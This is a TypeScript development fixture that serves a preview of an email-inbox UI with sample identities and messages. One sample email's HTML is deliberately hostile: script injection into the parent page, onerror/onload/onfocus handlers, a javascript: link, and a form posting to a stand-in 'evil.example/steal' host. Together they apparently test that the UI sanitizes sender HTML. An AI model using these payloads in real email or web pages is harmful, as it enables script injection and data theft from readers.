// Development-only browser fixture for the built-in inbox UI.
// Run from packages/api: npx -y bun@1.2.21 run dev/preview.ts
process.env.DOMAIN ??= 'preview.test';
process.env.API_KEYS ??= 'preview-token';
process.env.IMAP_USER ??= 'agent@preview.test';
process.env.IMAP_PASS ??= 'preview-imap';
process.env.SMTP_USER ??= 'agent@preview.test';
process.env.SMTP_PASS ??= 'preview-smtp';
process.env.RETENTION_DAYS ??= '0';

const { Hono } = await import('hono');
const {
  UiSessionStore,
  createUiSessionRoutes,
  requireUiOrigin,
  uiSessionBodyLimit,
} = await import('../src/lib/ui-session.ts');
const { createUiApiRoutes } = await import('../src/routes/ui.ts');
const { registerUiAssets } = await import('../src/routes/ui-assets.ts');
const { createUiFrameRoutes } = await import('../src/routes/ui-frame.ts');

const identities = [
  {
    address: 'fox@preview.test',
    name: 'Signup Fox',
    createdAt: '2026-07-27T08:00:00.000Z',
  },
  {
    address: 'empty@preview.test',
    name: 'Empty Inbox',
    createdAt: '2026-07-27T08:05:00.000Z',
  },
];

const messages = [
  {
    id: '7',
    from: 'Security Team <security@example.com>',
    to: 'fox@preview.test',
    subject: 'Confirm your new account',
    date: '2026-07-27T09:34:00.000Z',
    seen: false,
    snippet: 'Use verification code 482731 or review the confirmation link.',
    hasOtp: true,
  },
  {
    id: '6',
    from: 'Build Monitor <builds@example.net>',
    to: 'fox@preview.test',
    subject: 'Nightly build completed',
    date: '2026-07-27T08:12:00.000Z',
    seen: true,
    snippet: 'All checks passed. The report is ready.',
    hasOtp: false,
  },
];

const details = new Map([
  [
    '7',
    {
      ...messages[0],
      text:
        'Welcome!\n\nYour verification code is 482731.\n\n' +
        'Confirm at https://accounts.example.com/confirm?id=preview\n\n' +
        'This code expires in ten minutes.',
      html:
        '<style>body{background:red}</style>' +
        '<script>window.parent.document.body.dataset.pwned="yes";alert(1)</script>' +
        '<img src="https://evil.example/pixel" onerror="alert(2)">' +
        '<form action="https://evil.example/steal"><input autofocus onfocus="alert(3)"></form>' +
        '<svg onload="alert(4)"><a href="javascript:alert(5)">bad</a></svg>' +
        '<div><h1>Confirm your account</h1><p>Your verification code is ' +
        '<strong>482731</strong>.</p><blockquote>No scripts, images, forms, links, ' +
        'or sender styles survive this isolated preview.</blockquote></div>',
      otp: {
        codes: ['482731'],
        links: ['https://accounts.example.com/confirm?id=preview'],
      },
      links: [
        'https://accounts.example.com/confirm?id=preview',
        'https://example.com/help/security',
      ],
    },
  ],
  [
    '6',
    {
      ...messages[1],
      text: 'All nightly checks passed.\n\nNo action is required.',
      otp: { codes: [], links: [] },
      links: ['https://example.net/builds/preview'],
    },
  ],
]);

const dependencies = {
  listIdentities: () => identities,
  listMessages: async (address: string, limit: number) =>
    address === 'fox@preview.test' ? messages.slice(0, limit) : [],
  getMessage: async (address: string, id: string) =>
    address === 'fox@preview.test' ? (details.get(id) ?? null) : null,
};

const app = new Hono();
const sessions = new UiSessionStore({
  resolveToken: (token) => (token === 'preview-token' ? { kind: 'admin' } : null),
});
registerUiAssets(app);
app.use('/ui/api/session', uiSessionBodyLimit);
app.use('/ui/api/session', requireUiOrigin);
app.route('/ui/api/session', createUiSessionRoutes(sessions));
app.route('/ui/api', createUiApiRoutes(sessions, dependencies));
app.route('/ui/frame', createUiFrameRoutes(sessions, dependencies));

const port = Number(process.env.PREVIEW_PORT ?? 4310);
Bun.serve({ port, fetch: app.fetch });
console.log(`[ui-preview] http://localhost:${port}/ui — token: preview-token`);
